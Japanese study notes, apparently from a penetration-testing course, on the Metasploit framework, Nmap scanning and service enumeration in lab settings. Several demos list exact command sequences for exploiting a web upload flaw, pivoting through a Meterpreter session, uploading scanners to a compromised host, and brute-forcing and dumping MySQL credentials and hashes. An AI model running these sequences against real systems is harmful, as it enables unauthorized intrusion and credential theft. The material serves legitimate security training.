Metasploit
Metasploit frameworkの概要
Metasploit frameworkの紹介
・MSFは、オープンソースの堅牢なペンテスおよび脆弱性攻撃のフレームワークで、世界中のペンテスターやセキュリティ研究所で使っている。
・MSFは、ペンテストのライフサイクルのあらゆる段階を自動化するために必要な堅牢なインフラをテスターに提供する
・そして、exploitの開発およびテストも行なっており、世界最大級の公開・検証済みエクスプロイトデータベースを持っている。
・MSFでは、モジュール式の設計なので、新しい機能を容易に実装可能

・MSFのソースコードは、Githubで入手可能
・開発者たちは、常に新しいエクスプロイトをフレームワークに追加している。

・以下は重要な用語である
1) インターフェース：msfとやりとりするための方法
2) モジュール：特定のタスクを実行するためのコードの断片
3) 脆弱性：攻撃者に悪用され得るコンピュータ内やネットワーク内の弱点または欠陥
4) エクスプロイト：システム、サービス、アプリケーション内の脆弱性を悪用するためのコードやモジュール
5) ペイロード：エクスプロイトによってターゲットシステムに送られるコード
6) リスナー：ターゲットからの接続を待ち受けるプログラム
7) ライブラリ：複数のプログラムが共通して使える機能をまとめたコードの集まり

・msfが正式に公開されたのは、2003年

MSFのアーキテクチャー
・MSFの全体像

・MSFモジュールには以下のものがある
1) エクスプロイト：脆弱性を利用するためのモジュールでペイロードと組み合わせて使う
2) ペイロード：エクスプロイト成功後にMSFがターゲットに送り、リモートで実行されるコード
3) エンコーダ：AV検出を回避するためにペイロードをエンコードするためのモジュール
4) NOPs：ペイロードのサイズを一定にし、実行時の安定性を保つために使われる
5) Auxiliary：ポートスキャンや列挙など、攻撃以外の追加機能を実行するモジュール

・ペイロードには以下の2種類がある。
1) Non-Staged Payload
・エクスプロイトとともにそのままターゲットに送られるペイロード
・ステージ分割せず、一塊で送って実行する
2) Staged Payload
・これはペイロードを2段階で送る方式
　最初の部分は、ターゲット上で攻撃者へ逆接続を確立するための小さなコードを含む
  リバース接続を確立すると、攻撃者側から残りの本体をダウンロードして実行する

・StageとStagersについて
1) Stage
・Stagerによってダウンロードされるペイロード本体の要素
2) Stager
・Stagerは通常、攻撃者とターゲットの間で安定した通信チャネルを確立するために使われ、その後、ターゲット上でステージペイロードがダウンロードされ実行される。

・Meterpreter payloadは、高度で多機能なペイロードで、ターゲット上のメモリ上で実行されるため検出が難しくなっている。
→MeterpreterはStagerのソケット経由で通信し、攻撃者に対してターゲット上で対話型のコマンドを提供
→これを使用すると、システムコマンドの実行、ファイルシステムの操作、キー入力の記録などの操作可能

・msfの開発には、Rupyが使用されている。

MSFを使用したペンテス
・MSFは、ペンテスのライフサイクルに含まれる様々なタスクを実行および自動化するために使用できる。

・ペネトレーションテスト実行基準(PTES)は、包括的で最新のペンテストの基準の必要性に対応することを目的に、書かれたペンテストの手法


Metasploitの基礎
MSFのインストールと設定
・MSFは、Rapid7によって配布されており、WindowsとLinuxの両方でスタンドアロンパッケージとしてダウンロードしてインストールできる。

・MSFDatabaseは、MSFの不可欠な部分であり、アセスメントやホストのスキャン結果などを追跡するために使われる
→MSFは主要なデータベースサーバーとしてPostgresqlを使用するためPostgresqlが正しく設定されているかを確認する必要がある
→MSFDBは、nmapやnessusといったサードパーティーツールからのスキャン結果やインポートの保存も容易になる

quiz
・MSFDBをセットアップおよび初期化するために使用できるコマンドは、sudo msfdb init

MSF consoleの基礎
・MSFconsoleは、MSFのすべての機能にアクセスできる、使いやすいオールインワンのインターフェース

・MSFモジュールは、通常、リモートのエクスプロイト/接続を開始するために、ターゲットやホストのIPアドレスやポートといった情報を必要とする。
→これらのオプションは、MSFの変数を使って設定できる。
→この変数は、グローバルでもローカルでもどちらでもいける

・MSF module 変数
変数            用途
LHOST　　　　　攻撃者側システムのIPアドレスを格納するための変数
LPORT　　　　　攻撃者側でリバース接続を受けるために使用するポート番号を格納するための変数
RHOST　　　　　ターゲットシステム/サーバーのIPアドレスを格納するための変数
RHOSTS　　　　 複数のターゲットIPやネットワークレンジを指定するための変数　
RPORT　　　　　ターゲット側で攻撃対象となるポート番号を格納する変数

quiz
・windowsと互換性のあるモジュールのみを表示するように結果を制限するために使用できるmsfconsoleは、search type:exploit platform：windows

情報収集と列挙
Nmap
Nmapによるポートスキャンと列挙
・Nmapは、ネットワーク上のホストを発見したり、対象のオープンポートをスキャンしたりするために使用できる無料かつオープンソースのネットワークスキャナー
・オープンポートで稼働しているサービスや対照システム上で動作しているOSを列挙もできる


・Nmapのスキャンのうち、スキャンの結果をXMLに出力するために使用できるのは、nmap -sV -O IPアドレス -oX output

・-sn：ポートスキャンは行わずに生存確認のみ行う
・-Pn：生存確認は行わずに、すべて生きていると仮定して、ポートスキャンのみを行う
・-sV:稼働しているサービスとバージョンを検出する
・-O：使用しているOSを検出する。
・-sS：TCP/SYNスキャンを実行する。

Nmapの結果をMSFにインポートする
・db_import：外部のnmapスキャンの結果をMSFDBにインポートできる
・host
・services
・db_nmap -Pn -sV -O IPアドレス
・vulns

demo nmapスキャン結果をMSFにインポートする
1) ターミナルを起動する
2) ターゲットマシンにアクセスする。
ping -c 4 ターゲットIPアドレス
＊対象マシンにアクセスできない場合は、-Pnオプションを使ってオンラインであると仮定して続ける
3) 以下のコマンドでnmapスキャンの結果をmsfにインポートする。
nmap -sV -Pn -oX myscan.xml targetIP
4) msfにオンポートするためにpostgresqlデータベースサービスとmsfのコマンドラインを起動する。
service pregresql start
msfconsole
5) 以下のコマンドで、msfdbに接続されていることを確認する
db_status
6) 以下のコマンドで、データベースにnmapのスキャンの結果をインポートする。
db_import myscan.xml
7) 以下のコマンドを実行すると結果を表示できる
hosts（ターゲットIPが表記されれば正常）
services（最初のスキャンと同じ結果であれば正常）




列挙
補助モジュールによるポートスキャン
・補助モジュールは、スキャン、検出、ファジングなどの機能を実行するために使用する。
・補助モジュールを使って、TCP/UDPのポートスキャンを行ったり、FTP,SSH,HTTPなどのサービスから情報を列挙できる。
・補助モジュールは、exploitだけでなく、after exploitでも利用可能
・初期アクセスをターゲットシステムで取得した後に、別のネットワークサブネット上のホストを発見したりポートスキャンを行ったりするためにも補助モジュールを使用できる

・curl IPアドレス
・run autoroute -s IPアドレス
・sessions

demo ネットワークサービススキャン
1) ターミナルを起動する
2) ターゲットマシンにアクセスできるか確認
ping -c 4 targetIP
3) ターゲットのポートスキャンを行う
nmap targetIP
4) 以下のコマンドで、ターゲットマシンのポート80でホストされているHTTPコンテンツを確認する
curl targetIP
5) msfconsole
6) 該当のモジュールを選択してパラメータの値を設定する。
use exploit/unix/webapp/xoda_file_upload
set RHOSTS targetIP
set TARGETURI /
set LOHOST myIP
exploit
→これにより、ターゲットマシンでmeterpreterセッションが生成される
7) コマンドシェルを起動して、2番目のターゲットマシンのIPアドレスの範囲を特定する。
shell
ip addr
8) metasploitのルーティングテーブルにルートを追加する
run autoroute -s targetIP1
9) 現在のmeterpreterセッションをバックグラウンドで実行し、metasploiのportscan tcpモジュールを使用して2番目のターゲットマシンをスキャンする。
Ctrl+zを押すと、meterpreterをバックグラウンド実行に移す
use auxiliary/scanner/portscan/tcp
set RHOSTS targetIP
set verbose false
set port 1-1000
exploit
10) 「/usr/bin」ディレクトリで使用可能な静的バイナリを確認する
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
11) metasploitセッションをバッググラウンドで実行し、bashポートスキャンスクリプトを作成する。
Ctrl+z
以下のスクリプトを作成
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
名前は、bash-port-scanner.shとして保存
12) metaploitセッションをフォアグラウンドにしてmeterpreterセッションに切り替える
fg+enter
13) nmap静的バイナリとbashポートスキャナースクリプトをターゲットマシンにアップロード
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scannner.sh /tmp/bash-port-scanner.sh
14) バイナリとスクリプトを実行可能にし、bashスクリプトを使用して2番目のターゲットマシンをスキャンする。
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh IP
15) nmapバイナリを使用してターゲットの開いているポートをスキャンする
./nmap -p- IP




FTP列挙
・FTPは、TCPポート21を使用するプロトコルで、サーバーとクライアント間でファイルの共有を行うために使用する
・FTPは、webサーバのディレクトリとの間でファイルを送受信する手段として頻繁に使用する
・複数の補助モジュールを使用して情報を列挙したり、ETPサーバーを実行しているターゲットに対してブルートフォース攻撃を実行できる。
・FTPの認証には、ユーザ名とパスコードの組み合わせだが、設定が不適切な場合は、匿名でログインできることもある。



SMB列挙
・SMBは、ローカルネットワーク上のコンピュータ間でファイルや周辺機器の共有を容易にするために使用されるネットワークファイル共有プロトコル
・SMBのポートは445を使用する。
・SAMBAは、SMBのLinux実装で、windowsシステムがLinuxの共有やデバイスへのアクセスができるようにする。
・補助モジュールを使用することにより、SMBのバージョン、共有やユーザーの列挙やブルートフォースによるユーザ名やパスコードの解析ができる。

webserver 列挙
・webserverは、web上でWebサイトのデータを配信するために使用されるソフトウェア
・webserverはHTTPを利用して、クライアントとwebサーバー間の通信を行う。
・HTTPはアプリケーション層のプロトコルで、通信にTCPポート８０を使用する。
・補助モジュールを使用して、webサーバーのバージョン、HTTPヘッダー、ディレクトリのブルートフォースなどの列挙することができる。
・よく使用されるwebserverの例は、apache、Nginx、Microsoft IIS

MySQL　列挙
・MySQLは、SQL(Structured Query Language)に基づくオープンソースのリレーショナルデータベース管理システム
・通常は、記録や顧客データを格納するために利用され、ウェブアプリケーションのデータ保存によく利用される
・MySQLはデフォルトでTCP port 3306を使用するが、他の空いているTCPポートで稼働させることができる
・補助モジュールによりMySQLのバージョンやパス特定のためのブルートフォースを実行可能


・verboseの設定

demo MySQLの列挙
1) ターミナルを起動する
2) nmapでスキャンする
nmap IPアドレス
3) msfconsole -q
4) バージョンの確認
use auxiliary/scanner/mysql/mysql_version
set RHOSTS IPアドレス
run
5) ブルートフォースによりクレデンシャルの特定
use auxiliary/scanner/mysql/mysql_login
set RHOSTS targetIP
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
＊クレデンシャル：システムやサービスを利用するための認証情報
6) 情報を列挙する
use auxiliary/admin/mysql_mysql_enum
set USERNAME root
set PASSWORD ブルーとでの判明したもの
set RHOSTS targetIP
run
7) mysqlへのアクセス
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD ブルートで判明した物
set RHOSTS targetIP
run
8) mysqlに特定のファイルが存在するかを確認
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD ブルートフォースで発見したもの
set RHOSTS targetIP
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
9) mysqlのユーザ情報を取得
 use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD 同じ
set RHOSTS targetIP
run
10) mysqlサーバに接続して、データベースの構造を引き出す
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD bruteによる
set RHOSTS targetIP
run
11) mysqlサーバーからの書き込み可能なディレクトリを特定
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS targetIP
set USERNAME root
set PASSWORD bruteによる
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run

SSH　列挙
・SSH(Secure Shell)は暗号化を提供するリモート管理用プロトコルで、Telnetの後継
・通常は、サーバーやシステムへのリモートアクセスに使用できる
・SSHは、TCPポート22を使用するが、他の開いているTCPポートに変更して運用できる
・補助モジュールによりパス特定のためのブルートフォースを実行できる


SMTP　列挙
・SMTPは、e-mailの送受信で使用されるコミュニケーションプロトコル
・SMTPは、デフォルトでTCPポート25を使用する。設定次第では、TCPポート465や587で動作する。
・補助モジュールにより。ターゲット上のSMTPのバージョンやユーザアカウントを列挙できる。

demo Postfix：偵察
1) ターミナルの起動する
2) nmapスキャンによりバナーとサーバー名の特定
nmap -sV -scriptt banner targetIP
3) netcatを使用してsmtpサービスに接続し、サーバーのドメイン名を取得
nc targetIP port_num

